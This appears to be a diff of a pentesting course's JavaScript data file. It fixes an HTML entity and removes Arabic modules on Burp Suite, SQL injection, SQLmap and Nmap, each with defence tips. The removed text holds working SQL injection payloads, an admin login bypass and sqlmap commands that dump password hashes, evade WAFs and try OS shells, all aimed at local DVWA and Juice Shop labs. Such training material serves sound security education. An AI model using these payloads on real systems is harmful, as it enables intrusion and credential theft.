@@ -207,7 +207,7 @@ const MODULES = [
     { title: 'SYN Scan (Stealth Scan)', desc: 'The <code>-sS</code> flag performs a SYN scan — Nmap sends a SYN packet and waits for a SYN/ACK (open) or RST (closed) without completing the handshake. This is faster and stealthier than a full connect scan. Requires root/sudo privileges:', code: { lang: 'bash', text: 'sudo nmap -sS 192.168.1.1' } },
     { title: 'Aggressive Scan', desc: 'The <code>-A</code> flag combines OS detection, version detection, script scanning, and traceroute in a single command. This is the most information-rich scan but also the most detectable.', code: { lang: 'bash', text: 'sudo nmap -A 127.0.0.1' } },
     { title: 'NSE Script Scanning: HTTP Enum', desc: 'The Nmap Scripting Engine (NSE) runs Lua scripts. Use the `http-enum` script to automatically search the target web server for common directories, hidden admin panels, and known vulnerabilities.', code: { lang: 'bash', text: 'nmap -p 8080 --script http-enum 127.0.0.1' } },
-    { title: 'NSE Script Scanning: HTTP Title', desc: 'Use the `http-title` script to quickly extract the `&lt;title&gt;` tag of the website on port 3000 without opening a browser. It will reveal "OWASP Juice Shop".', code: { lang: 'bash', text: 'nmap -p 3000 --script http-title 127.0.0.1' } },
+    { title: 'NSE Script Scanning: HTTP Title', desc: 'Use the `http-title` script to quickly extract the `<title>` tag of the website on port 3000 without opening a browser. It will reveal "OWASP Juice Shop".', code: { lang: 'bash', text: 'nmap -p 3000 --script http-title 127.0.0.1' } },
     { title: 'Timing Templates', desc: 'Control scan speed with <code>-T</code> (0–5). Lower values are slower but stealthier. Higher values are faster but noisier. <code>-T4</code> is recommended for fast local scanning.', code: { lang: 'bash', text: 'nmap -T4 -p- 127.0.0.1' } },
     { title: 'Save Output to Files', desc: 'Always save scan results. Nmap supports multiple output formats. Using `-oA` saves it in normal, XML, and grepable formats simultaneously.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 -oA lab_scan 127.0.0.1' } },
     { title: 'Scan an Entire Subnet', desc: 'In a real pentest, you scan whole networks. Use CIDR notation (e.g. `/24`) combined with <code>-sn</code> for a fast ping sweep to find live hosts before running port scans:', code: { lang: 'bash', text: 'nmap -sn 192.168.1.0/24' } }
@@ -383,336 +383,6 @@ const MODULES = [
 ]; // end MODULES
 
 /* ═══════════════════════════════════════════════════════════════════════════════
-   ARABIC MODULE DATA
-   ═══════════════════════════════════════════════════════════════════════════════ */
-
-const ARABIC_MODULES = [
-
-// ─── الوحدة 1: بروكسي Burp Suite ────────────────────────────────────────────
-{
-  id: 'burp-proxy', num: '01',
-  title: 'اعتراض بروكسي Burp Suite',
-  subtitle: 'تعلّم كيف تقوم وسيطات الويب (البروكسي) بالتقاط وفحص وتعديل حركة HTTP بين متصفحك والتطبيق المستهدف.',
-  tag: 'الوحدة 1 — أساسيات البروكسي',
-
-  concept: [
-    `في كل مرة تزور موقعاً إلكترونياً، يرسل متصفحك <strong>طلب HTTP</strong> إلى الخادم، الذي يرد بـ<strong>استجابة HTTP</strong>. عادةً يكون هذا التبادل غير مرئي — يحدث في أجزاء من الثانية خلف الكواليس.`,
-    `<strong>وسيط الويب (البروكسي)</strong> هو برنامج يجلس <em>بين</em> متصفحك والخادم. يعترض كل طلب واستجابة، مما يتيح لك قراءتها أو تعديلها أو إعادة تشغيلها قبل أن تصل إلى وجهتها.`,
-    `<strong>Burp Suite</strong> هو وسيط الويب القياسي في الصناعة لمختبري الاختراق. عند تفعيل ميزة <strong>Intercept</strong>، يتم إيقاف كل طلب صادر من متصفح Chromium المدمج وعرضه في محرر نص خام. يمكنك تغيير المعاملات والترويسات والمحتوى — ثم إعادة توجيه الطلب المعدّل إلى الخادم.`,
-    `هذا يمنحك تحكماً كاملاً في الحوار بين العميل والخادم، وهو أساس كل هجوم تطبيق ويب تقريباً.`
-  ],
-
-  analogy: { emoji: '📬', text: `تخيّل مفتشاً بريدياً في مرفق الفرز. كل رسالة (طلب HTTP) تغادر منزلك تمر عبر مكتبه. بإمكانه فتح الظرف وقراءة المحتوى وتغيير عنوان التسليم أو استبدال الرسالة الداخلية، أو السماح لها بالمرور. المستلم (الخادم) لا يدري أن الرسالة قد لُمست أصلاً. هذا المفتش هو وسيط Burp Suite الخاص بك.` },
-
-  steps: [
-    { title: 'تشغيل Burp Suite وفتح المتصفح المدمج', desc: 'شغّل Burp Suite Community Edition. انتقل إلى تبويب <strong>Proxy</strong> وانقر على <strong>"Open browser"</strong>. يفتح هذا نافذة Chromium مُهيأة مسبقاً لتوجيه كل حركة المرور عبر Burp — لا حاجة لإعدادات بروكسي يدوية.', code: null },
-    { title: 'تفعيل وضع الاعتراض', desc: 'في التبويب الفرعي <strong>Proxy → Intercept</strong>، انقر على زر التبديل حتى يقرأ <strong>"Intercept is on"</strong>. من هذه اللحظة، سيتم إيقاف كل طلب HTTP من المتصفح المدمج وعرضه لك.', code: null },
-    { title: 'التصفح إلى هدف Juice Shop', desc: 'في متصفح Burp المدمج، انتقل إلى نسخة Juice Shop المحلية. ستبدو الصفحة متوقفة لأن Burp يحتجز الطلب.', code: { lang: 'url', text: 'http://localhost:3000' } },
-    { title: 'فحص الطلب المعترض', desc: 'عُد إلى نافذة Burp. ستشاهد طلب GET الخام في لوحة Intercept. ادرس البنية — سطر الطلب، ترويسة Host، وكل المعاملات.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: localhost:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: ar,en;q=0.9\nConnection: keep-alive' } },
-    { title: 'إعادة التوجيه ومراقبة الاستجابة', desc: 'انقر على <strong>"Forward"</strong> في Burp لإرسال الطلب إلى الخادم. ستُحمَّل الصفحة الرئيسية لـ Juice Shop. تحقق من التبويب الفرعي <strong>HTTP history</strong> لرؤية الطلب واستجابة الخادم.', code: null },
-    { title: 'تعديل طلب أثناء التنفيذ', desc: 'انتقل إلى صفحة تسجيل الدخول في Juice Shop. عندما يعترض Burp طلب POST، عدّل قيمة معامل مباشرة في المحرر الخام قبل إعادة توجيهه. هذه هي المهارة الأساسية التي ستستخدمها في كل وحدة لاحقة.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"modified_value"}' } },
-    { title: 'إساءة استخدام التحقق من جانب العميل', desc: 'ثغرة شائعة هي الاعتماد فقط على المتصفح للتحقق الأمني. في Juice Shop، حاول إعطاء كمية سالبة لمنتج. واجهة المتصفح قد تمنعك، لكن يمكنك اعتراض طلب API في Burp وتغيير الكمية إلى رقم سالب.', code: { lang: 'json', text: '{"ProductId": 1, "quantity": -10}' } },
-    { title: 'اكتشاف لوحة النتائج المخفية', desc: 'تحتوي Juice Shop على "لوحة نتائج" مخفية تتتبع تقدمك في الاختراق. الرابط مخفي في واجهة المستخدم، لكن بفحص حزمة JavaScript أو استخدام Repeater يمكنك إيجاد المسار.', code: { lang: 'url', text: 'http://localhost:3000/#/score-board' } },
-    { title: 'استخدام Burp Repeater', desc: 'في <strong>HTTP history</strong>، انقر بزر الماوس الأيمن على أي طلب واختر <strong>Send to Repeater</strong>. Repeater يتيح لك إعادة تشغيل الطلب مرات عديدة مع تعديل معامل واحد في كل مرة ورؤية الاستجابة فوراً.', code: null }
-  ],
-
-  defense: [
-    { title: 'تشفير HTTPS / TLS', desc: 'شفّر كل حركة المرور بشهادات TLS. حتى لو اعترضت على الشبكة، البيانات غير قابلة للقراءة بدون المفتاح الخاص. احرص دائماً على توجيه HTTP إلى HTTPS.' },
-    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'اضبط ترويسة <code>Strict-Transport-Security</code> حتى ترفض المتصفحات الاتصال عبر HTTP العادي بعد الزيارة الأولى.' },
-    { title: 'تثبيت الشهادة (Certificate Pinning)', desc: 'يمكن للتطبيقات المحمولة تثبيت شهادة الخادم الدقيقة، ورفض شهادات البروكسي كشهادة Burp. هذا يمنع هجمات الوسيط (MITM) على حركة الموبايل الإنتاجية.' },
-    { title: 'التحقق من المدخلات على جانب الخادم', desc: 'لا تثق أبداً بالبيانات من جانب العميل. تحقق من كل معامل وعقّمه على الخادم — يمكن لأي بروكسي تجاوز أي فحوصات جانب العميل.' }
-  ],
-
-  payloads: { headers: ['العنصر', 'الوصف', 'المثال'], rows: [
-    ['GET',           'يجلب موارد من الخادم',                        'GET /api/users HTTP/1.1'],
-    ['POST',          'يرسل بيانات للخادم (نماذج تسجيل الدخول)',     'POST /rest/user/login HTTP/1.1'],
-    ['PUT',           'يستبدل موارد كاملة على الخادم',              'PUT /api/users/1 HTTP/1.1'],
-    ['DELETE',        'يحذف موارد من الخادم',                        'DELETE /api/users/1 HTTP/1.1'],
-    ['Host',          'ترويسة تحدد النطاق المستهدف',                'Host: localhost:3000'],
-    ['Cookie',        'ترويسة تحمل رموز الجلسة',                    'Cookie: token=abc123'],
-    ['Content-Type',  'ترويسة تُعلن تنسيق جسم الطلب',              'Content-Type: application/json'],
-    ['Authorization', 'ترويسة تحمل بيانات الاعتماد',                'Authorization: Bearer eyJhb...'],
-    ['200 OK',        'الخادم عالج الطلب بنجاح',                    'HTTP/1.1 200 OK'],
-    ['301 Redirect',  'المورد انتقل دائماً إلى URL آخر',             'HTTP/1.1 301 Moved Permanently'],
-    ['403 Forbidden', 'الخادم يرفض تفويض الطلب',                   'HTTP/1.1 403 Forbidden'],
-    ['500 Server Error','خطأ غير متوقع على جانب الخادم',            'HTTP/1.1 500 Internal Server Error']
-  ]}
-},
-
-// ─── الوحدة 2: حقن SQL ────────────────────────────────────────────────────────
-{
-  id: 'sqli', num: '02',
-  title: 'حقن SQL (SQLi)',
-  subtitle: 'افهم كيف يمكن للمدخلات غير المعقّمة التلاعب بالاستعلامات الخلفية لقاعدة البيانات لتسريب البيانات أو تجاوز المصادقة.',
-  tag: 'الوحدة 2 — اختراق قاعدة البيانات',
-
-  concept: [
-    `تُخزّن معظم تطبيقات الويب البيانات في <strong>قاعدة بيانات علائقية</strong> (MySQL، PostgreSQL، SQLite). عندما تُرسل نموذجاً — مثل تسجيل الدخول أو مربع البحث — يبني التطبيق <strong>استعلام SQL</strong> باستخدام مدخلاتك.`,
-    `على سبيل المثال، قد ينتج نموذج تسجيل الدخول: <code>SELECT * FROM users WHERE username = 'مدخلك' AND password = 'كلمتك'</code>. إذا وصل المطور مدخلاتك مباشرة بالاستعلام دون تعقيم، يمكنك حقن صيغة SQL الخاصة بك.`,
-    `بإدراج سلسلة مصنوعة بعناية مثل <code>' OR '1'='1</code>، تغيّر منطق الاستعلام بحيث يُرجع دائماً صواباً — متجاوزاً فحص كلمة المرور فعلياً ومُرجعاً كل الصفوف.`,
-    `يمكن أن يؤدي حقن SQL إلى <strong>اختراق قاعدة البيانات بالكامل</strong>: قراءة كل سجلات المستخدمين، واستخراج تجزئات كلمات المرور، وتعديل البيانات، أو حتى تنفيذ أوامر نظام التشغيل.`
-  ],
-
-  analogy: { emoji: '🏦', text: `تخيّل أنك تدخل بنكاً وتُسلّم الصرّاف ورقة سحب. عادةً تكتب رقم حسابك والمبلغ. لكن ماذا لو قرأ الصرّاف أي شيء تكتبه بشكل أعمى؟ يمكنك كتابة: "اسحب 100 دولار من حساب #1234 أو فقط أعطني كل شيء من كل حساب." لأن الصرّاف لا يتحقق من الورقة، يسلّم الخزينة بأكملها. هذا حقن SQL.` },
-
-  steps: [
-    { title: 'فتح DVWA وضبط مستوى الأمان', desc: 'انتقل إلى نسخة DVWA المحلية في متصفح Burp المدمج. سجّل الدخول ببيانات الاعتماد الافتراضية. ثم انتقل إلى <strong>DVWA Security</strong> واضبط المستوى على <strong>Low</strong>.', code: { lang: 'text', text: 'URL:      http://localhost:8080\nUsername: admin\nPassword: password' } },
-    { title: 'اختبار الإدخال الطبيعي في DVWA', desc: 'انتقل إلى "SQL Injection". أدخل <code>1</code> في حقل User ID وانقر Submit. التطبيق يُرجع معلومات المستخدم للمعرّف 1، مما يُؤكد أن النموذج متصل بقاعدة بيانات حية.', code: { lang: 'sql', text: "-- ما يُنفّذه الخادم داخلياً:\nSELECT first_name, last_name FROM users WHERE user_id = '1';" } },
-    { title: 'حقن Tautology (DVWA)', desc: 'الآن أدخل حمولة SQLi الكلاسيكية. هذا يُعدّل شرط WHERE بحيث يُقيَّم دائماً بصواب، مما يتسبب في إرجاع قاعدة البيانات لكل السجلات.', code: { lang: 'text', text: "1' OR '1'='1" } },
-    { title: 'تجاوز مصادقة Juice Shop', desc: 'افتح Juice Shop وانتقل إلى صفحة تسجيل الدخول. في حقل البريد الإلكتروني، أدخل بريد المدير متبوعاً بتعليق SQL. ضع أي شيء في حقل كلمة المرور.', code: { lang: 'text', text: "Email: admin@juice-sh.op' --\nPassword: a" } },
-    { title: 'فهم تجاوز Juice Shop', desc: 'بإضافة أحرف التعليق (`--`)، تُخبر محرك قاعدة بيانات SQLite بتجاهل بقية الاستعلام. لا يُنفَّذ فحص كلمة المرور أبداً!', code: { lang: 'sql', text: "-- يصبح الاستعلام الداخلي:\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = 'a';" } },
-    { title: 'SQLi القائم على الأخطاء', desc: 'أحياناً لا تحصل على سحب نظيف، لكن الخادم يُظهر أخطاء قاعدة البيانات. جرّب وضع علامة اقتباس مفردة في شريط بحث Juice Shop. إذا أرجعت الصفحة خطأ يذكر "SQLITE_ERROR"، فقد أكدت قابليتها للاستغلال.', code: { lang: 'text', text: "Search: apple'" } },
-    { title: 'استخراج إصدار قاعدة البيانات بـ UNION SELECT', desc: 'في DVWA، استخدم حقن UNION لاستخراج إصدار قاعدة البيانات. أولاً حدد عدد الأعمدة (DVWA يستخدم عمودين)، ثم احقن:', code: { lang: 'text', text: "1' UNION SELECT user(), version()-- -" } },
-    { title: 'تعداد كل الجداول', desc: 'بمجرد معرفة عدد الأعمدة، يمكنك تعداد كل جدول في قاعدة البيانات عن طريق الاستعلام من <code>information_schema</code>:', code: { lang: 'text', text: "1' UNION SELECT table_name, table_schema FROM information_schema.tables-- -" } },
-    { title: 'استخراج كلمات المرور', desc: 'الآن استهدف جدول المستخدمين لاستخراج تجزئات كلمات المرور. يمكن اختراقها لاحقاً بأدوات مثل John the Ripper أو hashcat:', code: { lang: 'text', text: "1' UNION SELECT user, password FROM users-- -" } }
-  ],
-
-  defense: [
-    { title: 'الاستعلامات المعيّنة / العبارات المُعدَّة', desc: 'الدفاع الأول. استخدم عناصر نائبة (<code>?</code> أو <code>:name</code>) بدلاً من دمج السلاسل. يُعامل مشغّل قاعدة البيانات المدخل كبيانات، ليس بصيغة SQL. مثال في PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
-    { title: 'التحقق من المدخلات والقائمة البيضاء', desc: 'إذا كان الحقل رقماً، حوّله إلى عدد صحيح. إذا كان اسماً، اسمح فقط بالأحرف والأرقام. ارفض أي شيء لا يتطابق مع النمط المتوقع.' },
-    { title: 'حسابات قاعدة البيانات ذات الامتيازات الأدنى', desc: 'يجب أن يكون لمستخدم قاعدة بيانات تطبيق الويب SELECT/INSERT/UPDATE فقط على الجداول التي يحتاجها — وليس أبداً امتيازات DBA أو root. هذا يحدد الضرر حتى لو نجح الحقن.' },
-    { title: 'جدار حماية تطبيقات الويب (WAF)', desc: 'انشر WAF (مثل ModSecurity) لاكتشاف وحظر أنماط SQLi الشائعة في الوقت الفعلي.' },
-    { title: 'معالجة الأخطاء العامة', desc: 'لا تكشف أبداً أخطاء قاعدة البيانات الخام للمستخدم. استخدم صفحات خطأ عامة. رسائل الخطأ التفصيلية تكشف أسماء الجداول وأنواع الأعمدة وبنية الاستعلام للمهاجمين.' }
-  ],
-
-  payloads: { headers: ['الحمولة', 'الغرض', 'المخاطر'], rows: [
-    ["' OR '1'='1",                         'Tautology — تجاوز شرط WHERE، يُرجع كل الصفوف',             'عالي'],
-    ["' OR '1'='1'-- -",                    'Tautology مع تعليق — يتجاهل بقية SQL',                     'عالي'],
-    ["' UNION SELECT null,null-- -",        'اكتشاف عدد الأعمدة للحقن القائم على UNION',               'متوسط'],
-    ["' UNION SELECT user(),version()-- -", 'يستخرج مستخدم DB الحالي وسلسلة الإصدار',                  'عالي'],
-    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", 'تعداد كل أسماء الجداول',    'عالي'],
-    ["' AND 1=1-- -",                       'اختبار أعمى قائم على Boolean — الصفحة طبيعية إذا كان صحيحاً', 'متوسط'],
-    ["' AND SLEEP(5)-- -",                  'اختبار أعمى قائم على الوقت — يؤخر الاستجابة 5 ثوانٍ',       'متوسط'],
-    ["admin@juice-sh.op'--",                'تجاوز تسجيل دخول Juice Shop — صيغة تعليق SQLite',           'عالي']
-  ]}
-},
-
-// ─── الوحدة 3: SQLmap ─────────────────────────────────────────────────────────
-{
-  id: 'sqlmap', num: '03',
-  title: 'SQLmap — حقن SQL الآلي',
-  subtitle: 'بعد فهم حقن SQL اليدوي، تعلّم كيف يُؤتمت SQLmap الاكتشاف والاستغلال واستخراج قاعدة البيانات بالكامل.',
-  tag: 'الوحدة 3 — الأتمتة والأدوات',
-
-  concept: [
-    `<strong>SQLmap</strong> هو أداة اختبار اختراق مفتوحة المصدر تُؤتمت دورة حياة حقن SQL بالكامل — الاكتشاف والاستغلال واستخراج البيانات. مُثبّتة مسبقاً على Kali Linux.`,
-    `تدعم جميع تقنيات الحقن الرئيسية: <strong>الأعمى القائم على Boolean</strong>، <strong>الأعمى القائم على الوقت</strong>، <strong>القائم على الأخطاء</strong>، <strong>القائم على UNION</strong>، و<strong>الاستعلامات المكدّسة</strong>. يُحدّد SQLmap تلقائياً محرك قاعدة البيانات ويُعدّل حمولاته وفقاً لذلك.`,
-    `<strong>لماذا نستخدمه بعد تعلم الحقن اليدوي؟</strong> يُعلّمك الحقن اليدوي الآليات الأساسية — تفهم <em>لماذا</em> تعمل الأشياء. ثم يتيح لك SQLmap توسيع نطاق هذه المعرفة بكفاءة: يختبر مئات الحمولات في ثوانٍ.`,
-    `يمكن لـ SQLmap أيضاً قراءة/كتابة ملفات على نظام ملفات الخادم، وتنفيذ أوامر نظام التشغيل، وحتى إنشاء shell تفاعلي — مما يجعله أحد أقوى الأدوات في مجموعة أدوات مختبر الاختراق.`
-  ],
-
-  analogy: { emoji: '🤖', text: `لقد تعلّمت للتو فتح قفل واحد يدوياً — تفهم كيف تعمل الدبابيس، وكيف تضغط بأداة الشد، وكيف تحسّ النقرة. SQLmap مثل آلة فتح قفل روبوتية يمكنها اختبار كل تركيبة دبابيس عبر كل قفل في المبنى في دقائق. يستخدم نفس التقنيات التي تعلّمتها يدوياً، لكن بسرعة الآلة.` },
-
-  steps: [
-    { title: 'تحديد URL المستهدف', desc: 'أولاً، استخدم Burp Suite (الوحدة 1) لتحديد URL به معامل تشتبه في كونه ضعيفاً. لصفحة SQLi في DVWA، يبدو URL هكذا:', code: { lang: 'text', text: 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' } },
-    { title: 'تشغيل فحص SQLmap أساسي (DVWA)', desc: 'افتح طرفية في Kali Linux. أرسل URL المستهدف إلى SQLmap مع علامة <code>-u</code>. أضف ملف تعريف الارتباط للجلسة حتى يكون SQLmap مُصادقاً عليه.', code: { lang: 'bash', text: 'sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=your_session_id; security=low"' } },
-    { title: 'أتمتة APIs JSON (Juice Shop)', desc: 'تستخدم Juice Shop حمولات JSON، وليس حقول نماذج قياسية. اعترض طلب تسجيل الدخول في Burp Suite، وانقر بزر الماوس الأيمن واختر "Save item" كـ `request.txt`.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"test"}' } },
-    { title: 'تشغيل SQLmap مع طلب Burp', desc: 'استخدم علامة <code>-r</code> للإشارة إلى الملف المحفوظ. سيُحلّل SQLmap تلقائياً الترويسات والURL والجسم JSON.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
-    { title: 'تعداد كل قواعد البيانات', desc: 'بمجرد تأكيد SQLmap لنقطة الحقن، استخدم <code>--dbs</code> لإدراج كل قاعدة بيانات على الخادم:', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs' } },
-    { title: 'تعداد الجداول في قاعدة بيانات', desc: 'اختر قاعدة بيانات من النتائج وأدرج كل جداولها بـ <code>-D</code> و<code>--tables</code>:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa --tables' } },
-    { title: 'استخراج البيانات', desc: 'استخرج البيانات الفعلية من الأعمدة التي تهتم بها. سيحاول SQLmap أيضاً اختراق تجزئات كلمات المرور تلقائياً:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa -T users -C user,password --dump' } },
-    { title: 'استخدام سكريبتات Tamper', desc: 'غالباً ما تحظر WAFs صيغة SQLi الأساسية. يحتوي SQLmap على "tamper scripts" لتشويش الحمولات. استخدم `--tamper=space2comment` لاستبدال المسافات بتعليقات `/**/` لتجاوز WAFs الأساسية.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --level=3 --risk=2' } }
-  ],
-
-  defense: [
-    { title: 'نفس دفاعات حقن SQL اليدوي', desc: 'تنطبق جميع دفاعات الوحدة 2 — الاستعلامات المعيّنة والتحقق من المدخلات وحسابات DB ذات الامتيازات الأدنى وجدران الحماية.' },
-    { title: 'تحديد المعدل (Rate Limiting)', desc: 'يُرسل SQLmap طلبات سريعة كثيرة. يمكن لتحديد المعدل واكتشاف الشذوذ وضع علامة على أنماط الفحص الآلي أو حظرها.' },
-    { title: 'أنظمة كشف التسلل / الوقاية منه', desc: 'يمكن لأدوات مثل Snort أو Suricata اكتشاف أنماط توقيع SQLmap وتنبيه فرق الأمن.' },
-    { title: 'تعطيل رسائل الخطأ التفصيلية', desc: 'يعتمد SQLi القائم على الأخطاء على تعريض الخادم لأخطاء قاعدة البيانات. اضبط التطبيق لعرض صفحات خطأ عامة في الإنتاج.' }
-  ],
-
-  payloads: { headers: ['العلامة', 'الغرض', 'المثال'], rows: [
-    ['-u URL',         'URL المستهدف مع المعامل القابل للحقن',         'sqlmap -u "http://target/page?id=1"'],
-    ['-r FILE',        'استخدام ملف طلب HTTP محفوظ من Burp Suite',      'sqlmap -r request.txt'],
-    ['--dbs',          'تعداد كل قواعد البيانات على الخادم',            'sqlmap -u URL --dbs'],
-    ['-D DB --tables', 'إدراج كل الجداول في قاعدة بيانات محددة',        'sqlmap -u URL -D dvwa --tables'],
-    ['--dump',         'استخراج البيانات من الجدول/الأعمدة المحددة',    'sqlmap -u URL -D dvwa -T users --dump'],
-    ['--batch',        'وضع غير تفاعلي (يُجيب تلقائياً على كل المطالبات)', 'sqlmap -r req.txt --batch'],
-    ['--level=N',      'شمولية الاختبار (1-5). أعلى = معاملات أكثر',   'sqlmap -u URL --level=5'],
-    ['--os-shell',     'محاولة إنشاء shell OS تفاعلي',                  'sqlmap -u URL --os-shell'],
-    ['--tamper=SCRIPT','تطبيق سكريبتات تشويش الحمولة لتجاوز WAFs',      'sqlmap -u URL --tamper=space2comment']
-  ]}
-},
-
-// ─── الوحدة 4: Nmap ───────────────────────────────────────────────────────────
-{
-  id: 'nmap', num: '04',
-  title: 'Nmap — فحص الشبكة والتعداد',
-  subtitle: 'أتقن أكثر أداة فحص شبكي استخداماً. تعلّم كل علامة رئيسية وتقنية فحص لاكتشاف المضيفين والمنافذ المفتوحة والخدمات الجارية.',
-  tag: 'الوحدة 4 — الاستطلاع',
-
-  concept: [
-    `<strong>Nmap (مخطط الشبكة)</strong> هو المعيار الفعلي لاكتشاف الشبكات ومراجعة الأمان. مُثبّت مسبقاً على Kali Linux ومتاح لجميع أنظمة التشغيل الرئيسية.`,
-    `في جوهره، يُرسل Nmap حزماً مُصمَّمة خصيصاً إلى المضيفين المستهدفين ويُحلّل الاستجابات لتحديد: أي <strong>مضيفين نشطون</strong>، أي <strong>منافذ مفتوحة</strong>، ما <strong>الخدمات والإصدارات</strong> الجارية على تلك المنافذ، وما <strong>نظام التشغيل</strong> الذي يستخدمه الهدف.`,
-    `يدعم Nmap عشرات أنواع الفحص، من فحوصات SYN الخفية التي لا تُكمل مصافحة TCP، إلى الفحوصات العدوانية التي تُحدد بصمات كل خدمة. يُوسّع <strong>محرك سكريبت Nmap (NSE)</strong> قدراته بمئات السكريبتات.`,
-    `فهم علامات Nmap أمر بالغ الأهمية — كل علامة تُغيّر سلوك الفحص بشكل كبير.`
-  ],
-
-  analogy: { emoji: '🔦', text: `تخيّل أنك حارس أمن بدأت وردية ليلية في مبنى مكاتب ضخم. تحتاج إلى التحقق من كل طابق وكل باب. المرور الأساسي (فحص ping) يُخبرك بالطوابق التي فيها أضواء مضاءة — أي المضيفون الأحياء. تجربة كل مقبض باب (فحص المنافذ) يُخبرك بالغرف غير المقفلة. النظر داخل الغرف المفتوحة (كشف الإصدار) يُخبرك بما بداخلها. Nmap هو مصباحك ومفتاحك الرئيسي ودفتر ملاحظاتك في آنٍ واحد.` },
-
-  steps: [
-    { title: 'فحص حاويات Docker', desc: 'أولاً، اكتشف المنافذ المفتوحة على localhost. يمكن لـ Nmap فحص جهازك للعثور على الحاويات المختبرية. استخدم <code>-p-</code> لفحص كل المنافذ.', code: { lang: 'bash', text: 'nmap -p- 127.0.0.1' } },
-    { title: 'كشف إصدار الخدمة', desc: 'تتحسس علامة <code>-sV</code> المنافذ المفتوحة لتحديد اسم الخدمة وإصدارها الدقيق. دعنا نرى ما الذي يعمل على المنافذ 3000 و8080.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 127.0.0.1' } },
-    { title: 'فحص SYN (الفحص الخفي)', desc: 'تُنفّذ علامة <code>-sS</code> فحص SYN — يُرسل Nmap حزمة SYN وينتظر SYN/ACK (مفتوح) أو RST (مغلق) دون إكمال المصافحة. هذا أسرع وأكثر خفاءً. يتطلب صلاحيات root/sudo:', code: { lang: 'bash', text: 'sudo nmap -sS 192.168.1.1' } },
-    { title: 'الفحص العدواني', desc: 'تجمع علامة <code>-A</code> كشف نظام التشغيل، كشف الإصدار، فحص السكريبت، والتتبع في أمر واحد. هذا أغنى فحص بالمعلومات لكن أيضاً الأكثر قابلية للكشف.', code: { lang: 'bash', text: 'sudo nmap -A 127.0.0.1' } },
-    { title: 'فحص NSE: تعداد HTTP', desc: 'يُشغّل سكريبت `http-enum` تلقائياً البحث عن المجلدات الشائعة ولوحات الإدارة المخفية والثغرات المعروفة على خادم الويب المستهدف.', code: { lang: 'bash', text: 'nmap -p 8080 --script http-enum 127.0.0.1' } },
-    { title: 'قوالب التوقيت', desc: 'تحكّم في سرعة الفحص بـ <code>-T</code> (0–5). القيم الأدنى أبطأ لكن أكثر خفاءً. <code>-T4</code> موصى به للفحص السريع المحلي.', code: { lang: 'bash', text: 'nmap -T4 -p- 127.0.0.1' } },
-    { title: 'حفظ المخرجات في ملفات', desc: 'احفظ دائماً نتائج الفحص. يدعم Nmap صيغ مخرجات متعددة. استخدام <code>-oA</code> يحفظها بالصيغ العادية وXML وقابلة للبحث بـ grep في آنٍ واحد.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 -oA lab_scan 127.0.0.1' } },
-    { title: 'فحص شبكة فرعية بأكملها', desc: 'في اختبار الاختراق الحقيقي، تفحص شبكات كاملة. استخدم صيغة CIDR مع <code>-sn</code> لمسح ping سريع لإيجاد المضيفين الأحياء:', code: { lang: 'bash', text: 'nmap -sn 192.168.1.0/24' } }
-  ],
-
-  defense: [
-    { title: 'قواعد جدار الحماية', desc: 'احظر أو قيّد معدل حزم الاستطلاع الواردة. اكشف فقط المنافذ التي يجب أن تكون متاحة للعموم. أسقط الحزم إلى المنافذ غير المستخدمة بصمت.' },
-    { title: 'إغلاق المنافذ غير الضرورية', desc: 'كل منفذ مفتوح هو سطح هجوم محتمل. عطّل الخدمات التي لا تحتاجها. شغّل <code>ss -tlnp</code> بانتظام لمراجعة الخدمات المستمعة.' },
-    { title: 'أنظمة كشف التسلل / الوقاية منه', desc: 'انشر IDS/IPS (Snort، Suricata) لاكتشاف أنماط فحص Nmap. كثير منها يمكنه التمييز بين فحوصات SYN وبصمات نظام التشغيل وحركة مرور سكريبت NSE.' },
-    { title: 'إخفاء البانر (Banner Obfuscation)', desc: 'عدّل بانرات الخدمة لإخفاء معلومات الإصدار. هذا لا يُصلح الثغرات لكن يُبطئ المهاجمين.' }
-  ],
-
-  payloads: { headers: ['العلامة', 'الغرض', 'المثال'], rows: [
-    ['-sS',          'فحص TCP SYN (خفي، افتراضي مع root)',            'sudo nmap -sS target'],
-    ['-sT',          'فحص TCP Connect (لا يحتاج root)',               'nmap -sT target'],
-    ['-sU',          'فحص منافذ UDP',                                 'sudo nmap -sU target'],
-    ['-sV',          'كشف الخدمة/الإصدار على المنافذ المفتوحة',       'nmap -sV target'],
-    ['-O',           'بصمات / كشف نظام التشغيل',                      'sudo nmap -O target'],
-    ['-A',           'عدواني (نظام التشغيل + الإصدار + السكريبتات)',  'sudo nmap -A target'],
-    ['-p PORTS',     'فحص منافذ أو نطاقات محددة',                    'nmap -p 22,80,443 target'],
-    ['-p-',          'فحص كل المنافذ الـ 65535',                      'nmap -p- target'],
-    ['-Pn',          'تخطي اكتشاف المضيف (التعامل مع المضيف كنشط)',   'nmap -Pn target'],
-    ['-sn',          'مسح ping فقط (بدون فحص منافذ)',                  'nmap -sn 192.168.1.0/24'],
-    ['-T0 إلى -T5',  'قالب التوقيت (0=جنوني البطء، 5=جنوني السرعة)', 'nmap -T4 target'],
-    ['-oA BASE',     'المخرجات بكل الصيغ',                            'nmap -oA results target']
-  ]}
-},
-
